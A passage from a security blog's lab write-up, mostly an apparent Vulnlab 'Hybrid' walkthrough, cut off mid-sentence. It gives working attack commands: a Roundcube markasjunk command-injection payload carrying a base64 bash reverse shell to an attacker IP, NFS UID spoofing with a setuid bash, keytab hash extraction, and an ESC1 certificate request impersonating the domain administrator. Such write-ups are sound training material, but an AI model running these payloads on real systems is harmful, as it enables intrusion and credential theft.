<code>root</code></p>\n<p><img src=\"/images/vulnlab/sync-vl/c.jpg\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This was a really enjoyable machine, as it tested a bit of theory crafted with what was in front of you - especially being able to reverse engineer the hash during the initial foothold. I also enjoyed the credential hunting&#x2F;reusage and the backup script alteration was really enjoyable. Much thanks to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://linux.die.net/man/1/rsync\">https://linux.die.net/man/1/rsync</a><br><a href=\"https://sqlite.org/cli.html\">https://sqlite.org/cli.html</a><br><a href=\"https://hashes.com/en/tools/hash_identifier\">https://hashes.com/en/tools/hash_identifier</a><br><a href=\"https://github.com/DaZ-CYBER/s_md5_hc\">https://github.com/DaZ-CYBER/s_md5_hc</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a></p>\n"},{"title":"Hybrid - Vulnlab","date":"2024-06-05T18:27:16.000Z","keywords":"Vulnlab, Easy, Linux, Windows","description":"This chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.","cover":"/images/vulnlab/hybrid-vl/hybrid_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.\n\n# Enumeration\n\nRunning our NMAP scanning to discover both machines `10.10.242.85` and `10.10.242.86`.\n\n```\n┌──(daz㉿LAPTOP-VA8M33JK)-[~/tech/vl/hybrid]\n└─$ cat initial_scan.txt\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:38 EDT\nNmap scan report for 10.10.231.245\nHost is up (0.095s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-29 04:39:03Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n|_ssl-date: TLS randomness does not represent time\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n|_ssl-date: TLS randomness does not represent time\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Not valid before: 2024-03-28T04:09:07\n|_Not valid after:  2024-09-27T04:09:07\n| rdp-ntlm-info:\n|   Target_Name: HYBRID\n|   NetBIOS_Domain_Name: HYBRID\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hybrid.vl\n|   DNS_Computer_Name: dc01.hybrid.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-03-29T04:39:51+00:00\n|_ssl-date: 2024-03-29T04:40:31+00:00; 0s from scanner time.\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2024-03-29T04:39:54\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT      ADDRESS\n1   94.83 ms 10.8.0.1\n2   95.02 ms 10.10.231.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 104.10 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:40 EDT\nNmap scan report for 10.10.231.246\nHost is up (0.094s latency).\nNot shown: 990 closed tcp ports (reset)\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)\n|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)\n25/tcp   open  smtp     Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n80/tcp   open  http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Redirecting...\n110/tcp  open  pop3     Dovecot pop3d\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_pop3-capabilities: AUTH-RESP-CODE TOP STLS UIDL PIPELINING SASL RESP-CODES CAPA\n|_ssl-date: TLS randomness does not represent time\n111/tcp  open  rpcbind  2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      37551/udp6  mountd\n|   100005  1,2,3      49714/udp   mountd\n|   100005  1,2,3      50857/tcp6  mountd\n|   100005  1,2,3      53003/tcp   mountd\n|   100021  1,3,4      34841/tcp   nlockmgr\n|   100021  1,3,4      35283/tcp6  nlockmgr\n|   100021  1,3,4      37554/udp   nlockmgr\n|_  100021  1,3,4      45267/udp6  nlockmgr\n143/tcp  open  imap     Dovecot imapd (Ubuntu)\n|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR STARTTLS ID LOGINDISABLEDA0001 have post-login Pre-login ENABLE LITERAL+ listed IDLE OK capabilities\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n587/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR OK ID Pre-login have post-login ENABLE capabilities LITERAL+ listed IDLE AUTH=LOGINA0001 AUTH=PLAIN\n|_ssl-date: TLS randomness does not represent time\n995/tcp  open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE TOP USER UIDL PIPELINING SASL(PLAIN LOGIN) RESP-CODES CAPA\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_ssl-date: TLS randomness does not represent time\n2049/tcp open  nfs      3-4 (RPC #100003)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6606\nOS:4698%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)\nOS:OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D4\nOS:ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)\nOS:ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%\nOS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\nOS:%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT      ADDRESS\n1   95.17 ms 10.8.0.1\n2   95.26 ms 10.10.231.246\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 87.40 seconds\n```\n\nWe can see here that there seems to be a Windows and a Linux machine, which probably hints at the fact that we are going to have to mess around with a domain-joined Linux machine.\n\nThe Windows machine appears to be the DC as the domain name for it is `dc01.hybrid.vl`, which means we'll turn our attention to the Linux machine first.\n\nThere seems to be an HTTP web server that is redirecting us somewhere. I also noticed that this machine's domain name is `mail01.hybrid.vl`, so we'll change this in our host file.\n\n![](/images/vulnlab/hybrid-vl/b.jpg)\n\nThis brings us to a Roundcube email login page, which we'll probably need to find credentials for.\n\n# External NFS Mounts\n\nBefore we mess with anything, I want to turn our attention to another potential vulnerable service on the machine - NFS.\n\nNFS is a file sharing service, much like CIFS(which essentially is SMB). Instead of directly viewing the shares through a command-line interface, we can use NFS to potentially view public shares and mount them to our machine.\n\nIn order to view the different mounts on NFS, we can browse the NFS interface using `showmount`\n`showmount -e 10.10.242.86`\n\nTo which we'll receive the following output:\n```\nExport list for 10.10.242.86:\n/opt/share *\n```\n\nThis means that we should be able to view all the contents of the `/opt/share` NFS share by mounting it to our machine.\n\n`sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`\n* `mount -t nfs` to specifically mount an NFS share.\n* `-o vers=3` due to our NMAP scan, which denoted the NFS version as 3 or 4.\n* `10.10.231.246:/opt/share /mnt/tmpmnt` mounting everything is `/opt/share` to `/mnt/tmpmnt`, which is a directory that will be created on our local machine.\n* `-o nolock` to disable file-locking, which prevents the execution of binaries on the NFS share.\n\nWithin the contents of `/tmp/tmpmnt`, we can see a file called `backup.tar.gz`. We can unzip this with `tar` - `tar -xzf backup.tar.gz`. This gives us access to both `etc` and `opt` directories in the file archive.\n\nUpon enumerating the boxes, I've found an file that seems to give us credentials to the Roundcube login. This file is `/etc/dovecot/dovecot-users`\n```\nadmin@hybrid.vl:{plain}Duckling21\npeter.turner@hybrid.vl:{plain}PeterIstToll!\n```\n\nUsing these credentials (I'll use the admin's credentials), we are able to log in to the Roundcube instance.\n\n![](/images/vulnlab/hybrid-vl/c.png)\n\n# MarkasJunk RCE\n\nUpon looking around, I've stumbled across an email that `admin` has sent to `peter.turner`, entailing that they'll be enabling a Junk plugin on the Roundcube server.\n\n![](/images/vulnlab/hybrid-vl/d.png)\n\nNot only that, but it seems we have another user named `Ed` who we might potentially get access to later. Just something to note down.\n\nThis points us to our attack path to get foothold - RCE.\n\nUpon doing some research on this junk filter plugin, I found record of a CVE that allows you to get unauthorized remote code execution by configuring the user's name, sending an email, and then sending the mail to the junk folder. https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\n\nThis essentially allows us to trigger an arbitrary command in the user's name due to a lack of filtering when this version of Roundcube is parsing an email. The article provided above entails the specifics on why this is the case, however it's really just important to note right now that we can execute commands by adding a `&` before and after our command in our email name so that Roundcube parses it incorrectly.\n\nLet's head over to `Compose > Edit Identities` (the little pencil icon next to our email) to perform this exploit.\n\nIf we try to add a command regularly as we interpreted above, such as:\n\n`admin&curl http://10.8.0.173:9001/&@hybrid.vl`\n\nRoundcube will tell us that our email address is invalid. While we could spend more time trying to understand specifically what characters it has on its blacklist, we can instead just push our commands in base64. I also found success in doing this in Burpsuite and URL encoding all special characters. This can be done in Burpsuite by capturing the request and then editing the `email` value.\n\nAfter messing around with a `curl` test payload, I managed to develop the following:\n\nThe command we are trying to execute is `curl http://10.8.0.173`, which I'm using to see if we can generate a callback to a simple Python server I'll stand up on our local machine. This brings us to the example name I've constructed below.\n`admin&echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo=|base64${IFS}-d|bash&@hybrid.vl`\n\nWe'll also want to URL encode any characters so they can bypass any blacklists that Roundcube is attempting to detect on the front-end, and also so that Burpsuite can parse them correctly.\n`admin%26echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo%3d|base64${IFS}-d|bash%26%40hybrid.vl`\n\n![](/images/vulnlab/hybrid-vl/e.png)\n\nUpon submitting the request, we can see that our name is accepted despite having special characters in it.\n\n![](/images/vulnlab/hybrid-vl/f.png)\n\nLet's compose an email now and send it back to ourselves to exploit the plugin. (All I did was compose an email and send it to `admin@hybrid.vl`).\n\nAdditionally, on my local machine, I'll start a simple python server on port `9001` to receive the request. `python3 -m http.server 9001`\n\n![](/images/vulnlab/hybrid-vl/g.png)\n\nWe'll now browse to the email in our inbox after sending it and click the `Junk` icon on the top of the email.\n\n![](/images/vulnlab/hybrid-vl/i.png)\n\nUpon clicking this, we can see that a GET request was sent from `10.10.242.86` back to our local machine. This means that we can execute commands and get a reverse shell on the target machine.\n  \n![](/images/vulnlab/hybrid-vl/j.png)\n\nLet's develop our command that we want to run, in this case I just used `Revshells.com` to generate a bash one-liner.\n\nWe'll also combine what we know previously to craft the following payload. Let's also set up a `netcat` listener to catch the web request and get us a shell. Command we are trying to run: `/bin/bash -i >& /dev/tcp/10.8.0.173/9001 0>&1`\n`admin%26echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMC4xNzMvOTAwMSAwPiYx|base64${IFS}-d|bash%26%40hybrid.vl`\n\nIf we do all of the same steps as outlined previously and use the `Junk` plugin in a new email, we can see that a reverse shell was spawned as user `wwwdata`.\n\n![](/images/vulnlab/hybrid-vl/q.png)\n\n# Internal Mounted NFS Exploit\n\nLooking around the box initially, there wasn't anything that I saw that screamed out at me out of the blue. I ended up dropping `Linpeas` to the box through a Sliver C2 beacon that I created, but didn't really see anything with it either.\n\nUpon searching some more, I decided to turn our attention back to NFS to potentially find any vulnerabilities with it. We can find the configurations for NFS in `/etc/export`\n\n```\n# /etc/exports: the access control list for filesystems which may be exported\n#\t\tto NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/opt/share *(rw,no_subtree_check)  \n```\n\nWhile normally we'd look for NFS privilege escalation vectors such as `no_root_squash`, we can actually exploit the `rw` parameter that is set to `/opt/share`. https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\n\nThis next exploit goes into depth on how NFS interprets the `rw` setting and by also exploiting `peter.turner@hybrid.vl`'s UID. If we run a `id` scan on `peter.turner@hybrid.vl`, we can see that they have a UID of `902601108`.\n\n```\nwww-data@mail01:~/roundcube$ id peter.turner@hybrid.vl\nid peter.turner@hybrid.vl\nuid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)\n```\n\nIf we create a user with the same UID, we can potentially exploit the `/bin/bash` binary by setting the sticky bit of `bash` and running it in the context of `peter.turner@hybrid.vl`. But how exactly does that make sense? Are we running `/bin/bash` as `peter.turner@hybrid.vl`? Yes and no. We're going to try and run `/bin/bash` as a user with the SAME UID as `peter.turner@hybrid.vl`. Meaning, if we create the same user on our local machine and modify the privileges to it using `rw`, we can run it in the context of `peter.turner@hybrid.vl`.\n\nSo to do this, we need to do the following:\n* Remote Host: `cp /bin/bash /opt/share/`\n\t* Copying the `/bin/bash` executable into the NFS share.\n* Local Host: `sudo useradd peter.turner@hybrid.vl -u 902601108`\n\t* Creating a user named `peter.turner@hybrid.vl` with the same UID as the UID on the remote machine.\n\t* NOTE: We will need to edit `/etc/login.defs` and change `UID_MAX` to a value greater than `902601108`.\n* Local Host: `sudo su -l peter.turner@hybrid.vl`\n\t* Logging into the new user we created.*\n* Local Host: `sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`\n\t* Mounting the NFS share to `/mnt/tmpmnt` once more.\n* Local Host: `cp /mnt/tmpmnt/bash /tmp/tmpbash/`\n\t* Copying the `bash` executable to a temporary directory just so we can reset the privileges of the binary/\n* Remote Host: `rm /opt/share/bash`\n\t* Removing the `bash` executable from the remote machine so that we can replace it with a newly configured bash executable.\n* Local Host: `cp /tmp/tmpbash/bash /mnt/tmpmnt/`\n\t* Copying our executable back into the NFS share.\n* Local Host: `chmod +s /mnt/tmpmnt/bash`\n\t* Configuring the sticky bit of the `bash` executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.\n* Remote Host: `/opt/share/bash -p`\n\t* We are running the `bash` binary with `-p`, which stands for `privileged mode`. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, `peter.turner@hybrid.vl`)\n\nThis should give us a shell as `peter.turner@hybrid.vl`, as denoted below.\n\n![](/images/vulnlab/hybrid-vl/r.png)\n\nThe only problem with having this type of shell is that we can't upgrade our shell in any way at the moment. Any attempt to do so will revert us back to `www-data`. That being said, I'll upload a Sliver C2 implant so we can download and upload files whenever we need to.\n\n# Reading KDBX\n\nIn the home directory, we can find the first flag to this chain as well as a `passwords.kdbx` file. We can use `kpcli` to open this file and read its contents.\n\nYou'll notice that if you try to show the `domain` entry, it will be blotted it in red. Copying this to any text file will reveal the real contents. An alternative is to use `KeaPassXC` if you're on Windows, though `kpcli` works fine as well.\n\n```\nkpcli:/> open passwords.kdbx\nkpcli:/> ls\n=== Groups ===\neMail/\nInternet/\nhybrid.vl/\n\nkpcli:/> cd hybrid.vl\nkpcli:/> ls\n\n=== Entries ===\n0. domain                                                                 \n1. mail                                                   mail01.hybrid.vl\n\nkpcli:/> show domain\n\n Path: /hybrid.vl/\nTitle: domain\nUname: peter.turner\n Pass: b0cwR+G4Dzl_rw\n  URL: \nNotes: \n```\n\nUpon testing these credentials to SSH on the machine, we can see that we have access through SSH as `peter.turner@hybrid.vl`. Slight note, my IP address did change since I took a break in between doing this.\n\n![](/images/vulnlab/hybrid-vl/s.png)\n\nUpon checking for privileges that we can exploit, it seems that this user can run all commands as `sudo`, which is a nice change of pace for once.\n\n```\npeter.turner@hybrid.vl@mail01:~$ sudo -l\n[sudo] password for peter.turner@hybrid.vl: \nMatching Defaults entries for peter.turner@hybrid.vl on mail01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser peter.turner@hybrid.vl may run the following commands on mail01:\n    (ALL) ALL\npeter.turner@hybrid.vl@mail01:~$ sudo su\nroot@mail01:/home/peter.turner@hybrid.vl# cd /root\nroot@mail01:~# ls\nflag.txt  snap\n```\n\nThe flag is in the `/root` directory as shown above, meaning we have compromised the first machine for this chain.\n\n# Pivoting to DC\n\nFor the next box, I'm assuming that we'll be able to start enumerating the machine with `peter.turner`'s valid credentials.\n\nThere is LDAP and SMB on the machine, so we could potentially verify whether this user is able to access anything. `crackmapexec smb 10.10.194.118 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw'\n\n```\nSMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)\nSMB         10.10.194.117   445    DC01             [+] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw\n\nSMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.194.117   445    DC01             [-] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw Error connecting to the domain, are you sure LDAP service is running on the target ?\n```\n\nWe'll enumerate the SMB instance first to see if we can find anything. `smbclient -L 10.10.194.117 -U 'peter.turner'`\n\n```\nPassword for [WORKGROUP\\peter.turner]:\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share \n\tSYSVOL          Disk      Logon server share\n```\n\nSeems like everything on SMB is relatively normal. NETLOGON and SYSVOL are normal shares, and we can't access any of the other shares. Just to verify though, I did go into NETLOGON and SYSVOL to ensure there wasn't anything there, which there wasn't.\n\nThe error we had before with LDAP is an error I've ran into before - we know that LDAP is running on the target based on the NMAP scan. Let's try and use `bloodhound-python` to enumerate the LDAP forest.\n`git clone https://github.com/dirkjanm/BloodHound.py.git`\n`python3 bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -c all -ns 10.10.194.117 --zip`\n\nThis will dump the LDAP forest for us, and any valid domain objects that it can find based on the credentials that we have.\n\n```\nINFO: Found AD domain: hybrid.vl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: dc01.hybrid.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: dc01.hybrid.vl\nINFO: Found 14 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: mail01\nINFO: Querying computer: dc01.hybrid.vl\nWARNING: Could not resolve: mail01: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.194.117@53 answered The DNS operation timed out.\nINFO: Done in 00M 19S\nINFO: Compressing output into 20240425021728_bloodhound.zip\n```\n\nWe can now use `bloodhound` with the compressed archive we just received to enumerate the LDAP forest. In case you have never used Bloodhound or Neo4J before, here's a resource to get started: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\n\nUpon uploading the data into Bloodhound, we can begin to enumerate if `peter.turner` has delegation over anything.\n\nOne thing I do want to note, there seems to be a user which we saw in the Roundcube instance named Ed. His full username seems to be `edward.miller@hybrid.vl`. I'm assuming we'll need to compromise him somehow, but that's still uphill. Bloodhound doesn't seem to note anything down at the moment for `peter.turner`'s privileges, so let's see what users we can find in the users file that Bloodhound dumped originally.\n\nI've compromised a list of these users based on the JSON that was provided, and modified it into a wordlist based on the user.\n\n```\nADMINISTRATOR@HYBRID.VL\nGUEST@HYBRID.VL\nKRBTGT@HYBRID.VL\nEDWARD.MILLER@HYBRID.VL\nPAMELA.SMITH@HYBRID.VL\nJOSH.MITCHELL@HYBRID.VL\nPETER.TURNER@HYBRID.VL\nOLIVIA.SMITH@HYBRID.VL\nRICKY.MYERS@HYBRID.VL\nEMILY.WHITE@HYBRID.VL\nELLIOT.WATKINS@HYBRID.VL\nKATHLEEN.WALKER@HYBRID.VL\nMARGARET.SHEPHERD@HYBRID.VL\n```\n\n```\nAdministrator\nGuest\nkrbtgt\nedward.miller\npamela.smith\njosh.mitchell\npeter.turner\nolivia.smith\nricky.myers\nemily.white\nelliot.watkins\nkathleen.walker\nmargaret.shepherd\n```\n\nDidn't seem like we could dump any `ASREP` hashes with `GetNPUsers`, nor could we dump any usable TGSs/TGTs for any of the users with `GetUserSPNs`.\n\nLet's turn our attention to another avenue we could target, ADCS.\n\n# ESC1 ADCS Exploitation\n\nADCS is a server role that essentially allows you to integrate PKI (Public Key Infrastructure) into an AD environment. This helps to maintain public key cryptography and digital signature/certificate capabilities. ADCS vulnerabilities can allow us to request a certificate used to authenticate on behalf of another user in the domain. Let's try to find any vulnerable certificate templates that we can use.\n\n`certipy-ad find -vulnerable -username 'peter.turner'@hybrid.vl -password b0cwR+G4Dzl_rw -dc-ip 10.10.194.117`\n\nWe'll see that this returns one result of a vulnerable certificate denoted as `HybridComputers`\n\n```\nCertificate Templates\n  0\n    Template Name                       : HybridComputers\n    Display Name                        : HybridComputers\n    Certificate Authorities             : hybrid-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : None\n    Private Key Flag                    : 16842752\n    Extended Key Usage                  : Client Authentication\n                                          Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 100 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 4096\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Domain Computers\n                                          HYBRID.VL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : HYBRID.VL\\Administrator\n        Write Owner Principals          : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n        Write Dacl Principals           : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n        Write Property Principals       : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'HYBRID.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nYou'll notice the `ESC1` vulnerability indicator at the bottom of the template, which is telling us that `Domain Computers` can enroll supplies subject and also allows client authentication. This essentially means that any user can request a certificate on behalf of any other user in the network, even if that user is a privileged user (such as `Administrator`).\n\nSo technically speaking, we can use our `peter.turner` credentials to generate a certificate on behalf of `Administrator`, right? Unfortunately, it's not that simple in our case.\nAs you can see, the only role that can do this is `HYBRID.VL\\\\Domain Computers`, which means that only domain computers can perform this.\n\nNow this is relatively easy to move around, as we already have control of another computer on the domain - the recent `MAIL01` computer that we just compromised previously. We'll need to find the NTLM hash of this domain computer, which we would normally just dump through tools such as `mimikatz` on a Windows machine. On a Domain-joined Linux machine, the NTLM hashes for the domain computer can usually be found in `/etc/krb5.keytab` in my experience.\n\n![](/images/vulnlab/hybrid-vl/t.png)\n\nUpon trying to read the file, we'll find out that it's unreadable since it is encrypted.\nWe can easily circumvent this by using a tool called `keytabextract.py`, which will dump the contents of this file in plaintext. https://github.com/sosdave/KeyTabExtract\n\n![](/images/vulnlab/hybrid-vl/u.png)\n\nWe can now use this NTLM hash to proceed with our certificate request.\n`certipy-ad req -u 'MAIL01$'@hybrid.vl -hashes '0f916c5246fdbc7ba95dcef4126d57bd' -ca 'hybrid-DC01-CA' -template HybridComputers -target hybrid.vl -upn 'administrator@hybrid.vl' -dns dc01.hybrid.vl -key-size 4096 -debug`\n\nOnce again as a reminder, make sure that `dc01.hybrid.vl` and `hybrid.vl` both are set to the IP address of the DC in your `/etc/hosts` file. Just a reminder.\nThis should save a certificate and private key to a file called `administrator_dc01.pfx`. We can use this `.pfx` to now authenticate to the DC and dump the 